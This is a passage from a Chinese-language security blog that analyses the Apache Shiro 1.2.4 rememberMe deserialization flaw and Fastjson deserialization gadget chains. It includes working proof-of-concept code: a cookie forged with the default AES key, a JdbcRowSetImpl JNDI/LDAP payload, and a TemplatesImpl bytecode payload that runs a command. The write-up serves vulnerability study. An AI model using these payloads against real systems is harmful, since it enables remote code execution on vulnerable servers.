    this.setEncryptionCipherKey(cipherKey);
    this.setDecryptionCipherKey(cipherKey);
&#125;
public void setEncryptionCipherKey(byte[] encryptionCipherKey) &#123;
    this.encryptionCipherKey = encryptionCipherKey;
&#125;
public void setDecryptionCipherKey(byte[] decryptionCipherKey) &#123;
    this.decryptionCipherKey = decryptionCipherKey;
&#125;
</code></pre>
<p>我们发现，<strong>AbstractRememberMeManager</strong>被创建的时候，会<strong>setCipherKey</strong>，而这个key是默认的。</p>
<p>分析到这里，好像和我们的remember Me没什么关系，继续往下看。</p>
<h4 id="RememberMe生成"><a href="#RememberMe生成" class="headerlink" title="RememberMe生成"></a>RememberMe生成</h4><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223154957970.png" alt="image-20211223154957970"></p>
<p>我们在登录成功这里下个断点,发现他会call到rememberIdentity()</p>
<p>我们跟进去</p>
<pre><code class="java">public void rememberIdentity(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo) &#123;
    PrincipalCollection principals = this.getIdentityToRemember(subject, authcInfo);//1
    this.rememberIdentity(subject, principals);
&#125;
    protected PrincipalCollection getIdentityToRemember(Subject subject, AuthenticationInfo info) &#123;
        return info.getPrincipals();//2
    &#125;
</code></pre>
<p>我们发现principals实际上我们的登录名</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163019109.png" alt="image-20211223163019109"></p>
<pre><code class="java">protected void rememberIdentity(Subject subject, PrincipalCollection accountPrincipals) &#123;
    byte[] bytes = this.convertPrincipalsToBytes(accountPrincipals);
    this.rememberSerializedIdentity(subject, bytes);
&#125;
</code></pre>
<p>获取到账号后，又会call到rememberIdentity()</p>
<p>我们跟进convertPrincipalsToBytes()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163224292.png" alt="image-20211223163224292"></p>
<p>再跟进encrpyt()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163334597.png" alt="image-20211223163334597"></p>
<pre><code class="java">    public byte[] getEncryptionCipherKey() &#123;
        return this.encryptionCipherKey;
    &#125;
</code></pre>
<p>发现<code>encryptionCipherKey</code>在之前分析的时候出现过</p>
<p>再回顾一下：</p>
<pre><code class="java">private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);

public AbstractRememberMeManager() &#123;
    this.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);//此处设置了cipher key
&#125;

public void setCipherKey(byte[] cipherKey) &#123;
    this.setEncryptionCipherKey(cipherKey);//设置加密密钥
    this.setDecryptionCipherKey(cipherKey);
&#125;
public void setEncryptionCipherKey(byte[] encryptionCipherKey) &#123;
    this.encryptionCipherKey = encryptionCipherKey;//由此我们可以看出，其实encryptionCipherKey就是上面默认的key
&#125;
public void setDecryptionCipherKey(byte[] decryptionCipherKey) &#123;
    this.decryptionCipherKey = decryptionCipherKey;
&#125;
</code></pre>
<p>到现在，我们已经明白，用户信息被做了AES加密</p>
<p>当加密数据都被返回后，下一步会执行rememberSerializedIdentity()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163615319.png" alt="image-20211223163615319"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163755978.png" alt="image-20211223163755978"></p>
<p><strong>因此我们可以判断出cookie中的rememberMe的产生流程</strong></p>
<ul>
<li>序列化用户名</li>
<li>AES加密序列化后的数据</li>
<li>base64编码处理上一步的数据</li>
<li>最后放入cookie</li>
</ul>
<h4 id="RememberMe解密"><a href="#RememberMe解密" class="headerlink" title="RememberMe解密"></a>RememberMe解密</h4><p>在AbstractRememberMeManager#getRememberedPrincipals下一个断点</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165224129.png" alt="image-20211223165224129"></p>
<p>然后重启服务器，会被断下来</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165446209.png" alt="image-20211223165446209"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165804156.png" alt="image-20211223165804156"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165926366.png" alt="image-20211223165926366"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165955572.png" alt="image-20211223165955572"></p>
<p><strong>现在RememberMe解密的流程也显而易见:</strong></p>
<ul>
<li>从Cookie中获取RememberMe值</li>
<li>获取到的值进行base64解码</li>
<li>base64解码</li>
<li>反序列化</li>
</ul>
<h3 id="漏洞利用及POC"><a href="#漏洞利用及POC" class="headerlink" title="漏洞利用及POC"></a>漏洞利用及POC</h3><p>首先在pom.xml中添加commons-collections dependency</p>
<pre><code class="xml">        &lt;dependency&gt;
            &lt;groupId&gt;commons-collections&lt;/groupId&gt;
            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
            &lt;version&gt;3.1&lt;/version&gt;
        &lt;/dependency&gt;
</code></pre>
<p>注意要reload maven（因为忘记重载maven，在这里卡了半天，发现后面的ClassLoader一直找不到class，调试半天也没搞明白为什么没有这个库）</p>
<p>这里我们将用到<strong>CommonsCollections11</strong>的链，CC6的链在此处不能打成功 - 因为Transformer[]会在寻找class的时候出现格式问题，其中会涉及到<strong>ParallelWebappClassLoader</strong>的父类<strong>WebappClassLoaderBase#loadClass</strong>；因此我们选择CommonCollections11这个链(没有Transformer[]数组)</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223232137157.png" alt="image-20211223232137157"></p>
<p>详见 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/W4nder/p/14508817.html%EF%BC%8C%E6%88%91%E5%9C%A8%E6%AD%A4%E5%A4%84%E5%B0%B1%E4%B8%8D%E5%A4%9A%E8%AE%B2%E8%A7%A3%E3%80%82">https://www.cnblogs.com/W4nder/p/14508817.html，我在此处就不多讲解。</a></p>
<p><strong>POC构造</strong></p>
<p><strong>此处我新建了一个项目，同时导入了三个库</strong></p>
<ul>
<li>shiro-core-1.2.4</li>
<li>slf4j-api-1.6.4</li>
<li>slf4j-simple-1.6.4</li>
</ul>
<p>这三个jar包可以在shiro-web项目中找到: 打开shiro-web项目下的pom.xml文件，搜索这三个库，然后鼠标放在名字上面即可看到路径</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223233932961.png" alt="image-20211223233932961"></p>
<p>然后找到相应的目录，copy jar包并导入我们的POC项目即可</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223234007242.png" alt="image-20211223234007242"></p>
<pre><code class="java">import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.IOException;

public class shiro550 &#123;
    public static void main(String[] args) throws IOException &#123;
        byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);//默认密钥

        AesCipherService aesCipherService = new AesCipherService();
        byte[] evilObj = getSerializedObj();//得到byte数组类型的序列化数据

        ByteSource finalsource = aesCipherService.encrypt(evilObj, DEFAULT_CIPHER_KEY_BYTES);//对该恶意序列化数据进行AES加密
        System.out.println(finalsource.toString());//打印出加密后的rememberMe
      

    &#125;
    public static byte[] getSerializedObj() throws IOException &#123;

        int n;
        FileInputStream fileInputStream = new FileInputStream(&quot;1.ser&quot;);//加载cc11生成的恶意序列化文件
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        while((n=fileInputStream.read())!=-1)&#123;
            byteArrayOutputStream.write(n);
        &#125;
        return byteArrayOutputStream.toByteArray();

    &#125;
&#125;
</code></pre>
<p>为什么我们加密后可以直接返回**finalsource.toString()**，不是说最后要base64编码吗？</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223232837239.png" alt="image-20211223232837239"></p>
<p>我们跟踪到最后可以发现，其返回了<strong>SimpleByteSource#toString()<strong>方法，而它就是返回了</strong>toBase64()</strong></p>
<p>现在我们将生成出来的一串字符复制到cookie的<strong>rememberMe</strong>处，执行后发现计算器弹出。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223232449924.png" alt="image-20211223232449924"></p>
<h3 id="Reference-7"><a href="#Reference-7" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/W4nder/p/14508817.html">shiro-1.2.4反序列化分析踩坑</a></p>
<p>P神-Java漫谈</p>
<h1 id="FastJson反序列化漏洞系列"><a href="#FastJson反序列化漏洞系列" class="headerlink" title="FastJson反序列化漏洞系列"></a>FastJson反序列化漏洞系列</h1><h2 id="前言-5"><a href="#前言-5" class="headerlink" title="前言"></a>前言</h2><p>FastJson是由阿里巴巴开发的一个java库，可将对象快速转换为json字符，同时也可将json字符串转化为相应的对象</p>
<h2 id="Fastjson的基础使用"><a href="#Fastjson的基础使用" class="headerlink" title="Fastjson的基础使用"></a>Fastjson的基础使用</h2><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>在做RESTFUL项目的时候常常需要将json数据格式进行转换，比如将<code>&#123;name:&quot;leihehe&quot;, age: 18&#125;</code>转成Student类的Object</p>
<h3 id="环境搭建-9"><a href="#环境搭建-9" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>在MAVAN中添加fastjson即可，本文将分析1.2.4及其之后的各种版本，测试时将下面的version进行修改即可。</p>
<pre><code class="xml">        &lt;dependency&gt;
            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
            &lt;version&gt;1.2.24&lt;/version&gt;
        &lt;/dependency&gt;
</code></pre>
<h3 id="将对象转化为json格式"><a href="#将对象转化为json格式" class="headerlink" title="将对象转化为json格式"></a>将对象转化为json格式</h3><p>首先准备一个User类：</p>
<pre><code class="java">public class User &#123;
    String name;

    public User()&#123;
        System.out.println(&quot;constructor invoked&quot;);

    &#125;
    public String getName() &#123;
        System.out.println(&quot;get name&quot;);
        return name;
    &#125;

    public void setName(String name) throws IOException &#123;
        System.out.println(&quot;set name&quot;);
        this.name = name;
    &#125;

    @Override
    public String toString() &#123;
        return &quot;User&#123;&quot; +
                &quot;name=&#39;&quot; + name + &#39;\&#39;&#39; +
                &#39;&#125;&#39;;
    &#125;
&#125;
</code></pre>
<p>写一个main方法测试：</p>
<pre><code class="java">public class Test &#123;
    public static void main(String[] args) throws IOException &#123;
        /* Serialization */
        User user = new User();
        user.setName(&quot;leihehe&quot;);
        String result = JSON.toJSONString(user);
        String result2 = JSON.toJSONString(user, SerializerFeature.WriteClassName);//Label the class name
        System.out.println(result);
        System.out.println(result2);
    &#125;
&#125;
</code></pre>
<p>在这里<code>toJSONString</code>有两种写法</p>
<ul>
<li><code>Json.toJSONString(obj)</code><ul>
<li>转换为JSON格式</li>
</ul>
</li>
<li><code>Json.toJSONString(obj,SerializerFeature.WriteClassName)</code><ul>
<li>在转换的JSON格式中指定该对象属于什么类</li>
</ul>
</li>
</ul>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108105129564.png" alt="image-20220108105129564"></p>
<p>可以发现<code>toJSONString</code>会call到get方法，其中第二种<code>JSONString</code>会返回@type，从而指明object所在类。</p>
<h3 id="将json格式转化为对象"><a href="#将json格式转化为对象" class="headerlink" title="将json格式转化为对象"></a>将json格式转化为对象</h3><p>FastJson有<strong>两种</strong>转换json格式为对象的方法</p>
<ul>
<li><code>JSON.parse(str)</code></li>
<li><code>JSON.parseObject(str)</code></li>
</ul>
<p>这两个其实都是一样的，只是<code>parseObject()</code>要比<code>parse()</code>多一个<code>toJson()</code>，也就是<code>parseObject()</code>返回的是<code>JSONObject</code>，而<code>parse()</code>返回的是其实际的类的对象</p>
<pre><code class="java">    public static JSONObject parseObject(String text) &#123;
        Object obj = parse(text);
        return obj instanceof JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);
    &#125;
</code></pre>
<p>parseObject()在实际运行的时候会调用get和set方法,其中get方法会在<code>toJSON()</code>中被调用</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108111958984.png" alt="image-20220108111958984"></p>
<p>而parse()只会调用对象的set方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112115321.png" alt="image-20220108112115321"></p>
<p>此处我们以<code>parse()</code>进行演示</p>
<pre><code class="java">        /* Deserialization */
        String jsonString=&quot;&#123;\&quot;name\&quot;:\&quot;leihehe\&quot;&#125;&quot;;
        Object obj2 = JSON.parse(jsonString);
        System.out.println(obj2);
</code></pre>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112140316.png" alt="image-20220108112140316"></p>
<p><strong>set</strong>方法并未被调用，因为fastJSON并不知道传过来的json应该被转换为哪一个类的对象，因此我们需要指定其<strong>type</strong></p>
<pre><code class="java">        String jsonString = &quot;&#123;\&quot;@type\&quot;:\&quot;entity.User\&quot;,\&quot;name\&quot;:\&quot;leihehe\&quot;&#125;&quot;;
        Object obj2 = JSON.parse(jsonString);
        System.out.println(obj2);
</code></pre>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112247858.png" alt="image-20220108112247858"></p>
<p>可见调用了constructor和set方法。</p>
<p>那么可以将恶意执行代码放在<code>User#setName()</code>里，就能执行了</p>
<pre><code class="java">    public void setName(String name) throws IOException &#123;
        System.out.println(&quot;set name&quot;);
        Runtime.getRuntime().exec(&quot;calc&quot;);
        this.name = name;
    &#125;
</code></pre>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112504772.png" alt="image-20220108112504772"></p>
<h2 id="Setter和Getter调用的深入探究"><a href="#Setter和Getter调用的深入探究" class="headerlink" title="Setter和Getter调用的深入探究"></a>Setter和Getter调用的深入探究</h2><h3 id="JavaBeanInfo-build"><a href="#JavaBeanInfo-build" class="headerlink" title="JavaBeanInfo#build"></a>JavaBeanInfo#build</h3><p>Fastjson是如何调用对应的setter和getter的呢？</p>
<p>关键点在于JavaBeanInfo#build方法中</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108204218773.png" alt="image-20220108204218773"></p>
<p>因为我们传入的@type并不满足该条件，因此不会进入if里的语句。</p>
<h3 id="Setter"><a href="#Setter" class="headerlink" title="Setter"></a>Setter</h3><p>继续往下看，这里的methods实际是上面的</p>
<pre><code class="java">Method[] methods = clazz.getMethods();//获取到的是public的methods
</code></pre>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108204615107.png" alt="image-20220108204615107"></p>
<p>此处遍历了所有的methods，<strong>并要求满足以下条件</strong>：</p>
<blockquote>
<p><strong>method name的长度大于等于4</strong></p>
<p><strong>method只能有一种parameter</strong></p>
<p><strong>method并非static类型</strong></p>
<p><strong>method的返回类型必须为void或者当前method所在的class的类型</strong></p>
</blockquote>
<p>这样才能进入执行下面的语句</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108205558062.png" alt="image-20220108205558062"></p>
<p>根据不同的情况，会产生不同的propertyName，简单来说，都是依照java常见的书写方法的格式。</p>
<p>如果以上条件都不满足，则在method的第一个字符变为大写并在前面加上is作为field</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108210443480.png" alt="image-20220108210443480"></p>
<p>最后用add方法，将filed添加到filedInfo中</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108210555536.png" alt="image-20220108210555536"></p>
<h3 id="Getter"><a href="#Getter" class="headerlink" title="Getter"></a>Getter</h3><p>紧跟着的，是Getter的获取</p>
<pre><code class="java">for(i = 0; i &lt; var29; ++i) &#123;
    method = var30[i];
    String methodName = method.getName();
    if (methodName.length() &gt;= 4 &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; methodName.startsWith(&quot;get&quot;) &amp;&amp; Character.isUpperCase(methodName.charAt(3)) &amp;&amp; method.getParameterTypes().length == 0 &amp;&amp; (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType())) &#123;
        JSONField annotation = (JSONField)method.getAnnotation(JSONField.class);
        if (annotation == null || !annotation.deserialize()) &#123;
            String propertyName;
            if (annotation != null &amp;&amp; annotation.name().length() &gt; 0) &#123;
                propertyName = annotation.name();
            &#125; else &#123;
                propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);
            &#125;

            fieldInfo = getField(fieldList, propertyName);
            if (fieldInfo == null) &#123;
                if (propertyNamingStrategy != null) &#123;
                    propertyName = propertyNamingStrategy.translate(propertyName);
                &#125;

                add(fieldList, new FieldInfo(propertyName, method, (Field)null, clazz, type, 0, 0, 0, annotation, (JSONField)null, (String)null));
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>
<p>可以看出被调用的getter需要<strong>满足以下要求</strong>:</p>
<blockquote>
<p>Method name &gt;=4</p>
<p>method不是static类型的</p>
<p>method name必须以get开头</p>
<p>method name的第四个字符必须是大写</p>
<p>method是无参的</p>
<p>method的返回类型是Collection、Map、AtomicBoolean、AtomicInteger、或AtomicLong中的任意一个</p>
</blockquote>
<p>最后会被添加到FieldInfo中</p>
<p>Build方法的最后会返回一个<code>JavaBeanInfo</code></p>
<p><code>return new JavaBeanInfo(clazz, builderClass, defaultConstructor, (Constructor)null, (Method)null, buildMethod, jsonType, fieldList);</code></p>
<h2 id="Fastjson的反序列化流程"><a href="#Fastjson的反序列化流程" class="headerlink" title="Fastjson的反序列化流程"></a>Fastjson的反序列化流程</h2><p>在<code>JSON.parse()</code>处下个断点</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164249197.png" alt="image-20220108164249197"></p>
<p>一直往下走，可以看见创建了<code>DefaultJSONParser</code>对象</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164603987.png" alt="image-20220108164603987"></p>
<p>跟进去看是如何创建的：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164636943.png" alt="image-20220108164636943"></p>
<p>这里会判断开头字符是否为<code>&#123;</code>，如果是，那么赋值token为12</p>
<p>接下来再进入parse()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164727601.png" alt="image-20220108164727601"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164746325.png" alt="image-20220108164746325"></p>
<p>因为之前token设置为12，所以跳入了case 12</p>
<p>创建一个新的<code>JSONObject</code>,并call到<code>parseObject()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164924577.png" alt="image-20220108164924577"></p>
<p>继续往下走：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108172115011.png" alt="image-20220108172115011"></p>
<p>在<code>TypeUtils#loadClass</code>中判断className，这里都不满足，因此跳过。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108173137665.png" alt="image-20220108173137665"></p>
<p><code>mappings.put(className, clazz);</code>将classname和对应的class放入mapping中，最后在进行反序列化。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108174017479.png" alt="image-20220108174017479"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108174039274.png" alt="image-20220108174039274"></p>
<h2 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h2><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p><code>JdbcRowSetImpl</code>可以配合JNDI+RMI或者JNDI+LDAP注入，如果不知道<a href="https://leihehe.top/2021/12/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3-9/">JNDI注入的师傅可以看这里</a></p>
<p>在JdbcRowSetImpl.class的connect方法中：</p>
<pre><code class="java">    private Connection connect() throws SQLException &#123;
        if (this.conn != null) &#123;
            return this.conn;
        &#125; else if (this.getDataSourceName() != null) &#123;
            try &#123;
                InitialContext var1 = new InitialContext();
                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());//此处是关键
                return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
            &#125; catch (NamingException var3) &#123;
                throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());
            &#125;
        &#125; else &#123;
            return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
        &#125;
    &#125;
</code></pre>
<p>发现了initialContext和lookup()，代表此处可以利用JNDI - 如果我们修改了<code>dataSourceName</code>为我们的RMI或者LDAP远程地址，那么就可以进行JNDI注入。</p>
<p>那么什么地方可以call到**connect()**呢</p>
<pre><code class="java">public void setAutoCommit(boolean var1) throws SQLException &#123;
    if (this.conn != null) &#123;
        this.conn.setAutoCommit(var1);
    &#125; else &#123;
        this.conn = this.connect();
        this.conn.setAutoCommit(var1);
    &#125;

&#125;
</code></pre>
<p>在setAutoCommit方法中，会call到connect()方法。</p>
<h3 id="POC构造-4"><a href="#POC构造-4" class="headerlink" title="POC构造"></a>POC构造</h3><p>在之前的<strong>Fastjson的反序列化流程</strong>中，我们有说到fastjson可以调用public的set方法，<strong>那么我们就可以构造这样的一个</strong>jsonString</p>
<pre><code class="java">String evilStr=&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;

Object obj2 = JSON.parse(evilString);

System.out.println(obj2);
</code></pre>
<p>传入的json中，属性有dataSourceName和autoCommit，因此在使用<code>JSON.parse()</code>的时候，dataSource和autoCommit对应的<code>setDataSource()</code>和<code>autoCommit()</code>都会被call</p>
<p>从而能够执行以下代码</p>
<pre><code class="java">initialContext.lookup(&quot;ldap://127.0.0.1:7777/#EvilObject&quot;)
</code></pre>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108201834255.png" alt="image-20220108201834255"></p>
<h2 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a>TemplatesImpl利用链</h2><h3 id="利用链分析-1"><a href="#利用链分析-1" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>在cc链的分析中，我们多次用到了TemplatesImpl利用链，利用链如下</p>
<blockquote>
<p>TemplatesImpl#getOutputProperties()<br>  TemplatesImpl#newTransformer()<br>      TemplatesImpl#getTransletInstance()<br>          TemplatesImpl#defineTransletClasses()<br>              TransletClassLoader#defineClass()</p>
</blockquote>
<p>简单回顾一下，我们可以将生成的恶意字节码赋值给TemplatesImpl中的<code>_bytecodes</code>,最后在defineClass中，会将该恶意字节码读取进JVM中。</p>
<p>先写一个恶意字节码：</p>
<pre><code class="java">public static String getEvilCode() throws CannotCompileException, IOException, NotFoundException &#123;
    ClassPool classPool = ClassPool.getDefault();
    CtClass ctClass = classPool.makeClass(&quot;Evil&quot;);
    classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
    ctClass.makeClassInitializer().insertBefore(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);
    ctClass.setSuperclass(classPool.getCtClass(AbstractTranslet.class.getName()));

    byte[] bytes = ctClass.toBytecode();
    String s = Base64.getEncoder().encodeToString(bytes);
    System.out.println(s);
    return s;
&#125;
</code></pre>
<ol>
<li>这里为什么要继承<strong>AbstractTranslet</strong>呢？</li>
</ol>
<p>我们在讲cc2链的时候说过，我们生成的恶意代码是在static代码块的，我们仍然需要让class对象被创建，这样才能执行我们的恶意代码。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127161222841.png" alt="img"></p>
<p>此处<strong>TemplatesImpl#getTransletInstance</strong>中，我们需要执行了<code>newInstance()</code>才能触发漏洞，而执行的字节码需要继承AbstractTranslet</p>
<ol start="2">
<li>为什么<strong>bytecodes</strong>最后需要用<strong>Base64</strong>编码？</li>
</ol>
<p>实际上fastjson在对field进行反序列化的时候，会进行base64解码，具体的我没有跟，有兴趣的师傅可以跟一下<code>FieldDeserializer#parseField</code></p>
<h3 id="POC构造与分析"><a href="#POC构造与分析" class="headerlink" title="POC构造与分析"></a>POC构造与分析</h3><pre><code class="java">import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.*;

import java.io.IOException;
import java.util.Base64;

public class EvilClass &#123;
    public static String getEvilCode() throws CannotCompileException, IOException, NotFoundException &#123;
    ClassPool classPool = ClassPool.getDefault();
    CtClass ctClass = classPool.makeClass(&quot;Evil&quot;);
    classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
    ctClass.makeClassInitializer().insertBefore(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);
    ctClass.setSuperclass(classPool.getCtClass(AbstractTranslet.class.getName()));

    byte[] bytes = ctClass.toBytecode();
    String s = Base64.getEncoder().encodeToString(bytes);
    System.out.println(s);
    return s;
    &#125;
    public static void main(String[] args) throws CannotCompileException, IOException, NotFoundException &#123;

        String evilJson=&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+getEvilCode()+&quot;\&quot;],\&quot;_name\&quot;:\&quot;leihehe\&quot;,\&quot;_tfactory\&quot;:&#123; &#125;,\&quot;outputProperties\&quot;:&#123; &#125;&#125;\n&quot;;
        JSON.parseObject(evilJson,Object.class,Feature.SupportNonPublicField);
    &#125;
&#125;
</code></pre>
<p>此处outputProperties会让fastjson找到getOuputProperties()，从而触发利用链。</p>
<p>但需要注意的是，在TemplatesImpl类中这几个方法是private的，所以我们需要开启<code>Feature.SupportNonPublicField</code>，这里也是导致<code>TemplatesImpl</code>链在fastjson反序列化漏洞利用中有所<strong>局限性</strong>的主要原因。</p>
<p>另外，在我们使用parseObject()时，需要指定为Object.class，否则返回的类型是JSONObject类型</p>
<p><code>JSON.parseObject()</code>和<code>JSON.parse()</code>需要满足的格式：</p>
<blockquote>
<p><code>JSON.parseObject(evilJson, Object.class, Feature.SupportNonPublicField);</code></p>
<p><code>JSON.parse(evilJson,Feature.SupportNonPublicField);</code></p>
</blockquote>
<p>后面的field基本上就是用反射的形式，设置value，例如<code>_bytecodes</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109150412316.png" alt="image-20220109150412316"></p>
<p>最后的outputProperties也一样，最后通过反射执行。<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109150849934.png" alt="image-20220109150849934"></p>
<p>弹出计算器</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109150954388.png" alt="image-20220109150954388"></p>
<h2 id="总结两条利用链的区别"><a href="#总结两条利用链的区别" class="headerlink" title="总结两条利用链的区别"></a>总结两条利用链的区别</h2><p>TemplatesImpl</p>
<ul>
<li>当fastjson不出网时，可以盲打</li>
<li>版本在1.2.22起才有SupportNonPublicField特性,且要求在代码中开启SupportNonPublicField.</li>
</ul>
<p>JdbcRowSetImpl链</p>
<ul>
<li>利用范围更广</li>
<li>当fastjson不出网时，无法完成jndi注入，同时高版本中的jdk有一些限制，只能通过利用本地类来完成反序列化漏洞利用。</li>
</ul>
<h2 id="Fastjson各个版本分析"><a href="#Fastjson各个版本分析" class="headerlink" title="Fastjson各个版本分析"></a>Fastjson各个版本分析</h2><h3 id="1-2-25版本变化"><a href="#1-2-25版本变化" class="headerlink" title="1.2.25版本变化"></a>1.2.25版本变化</h3><p>可以发现在1.2.25中: <code>TypeUtils.loadClass()</code>被修改为了<code>checkAutoType()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109214228148.png" alt="image-20220109214228148"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109214347945.png" alt="image-20220109214347945"></p>
<p>1.2.25版本中，首先对autoTypeSupport布尔值进行判断，如果autoTypeSupport为true，那么开始检查黑名单和白名单，如果都不满足，则从Mapping中获取class。</p>
<p>如果autoTypeSupport为false，那么循环遍历白名单与黑名单，如果在黑名单中，则抛出异常，如果不在白名单中，则最后抛出<code>&quot;autoType is not support xxx&quot;</code>异常，因此如果autoTypeSupport为false，就一定无法执行成功。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109221758660.png" alt="image-20220109221758660"></p>
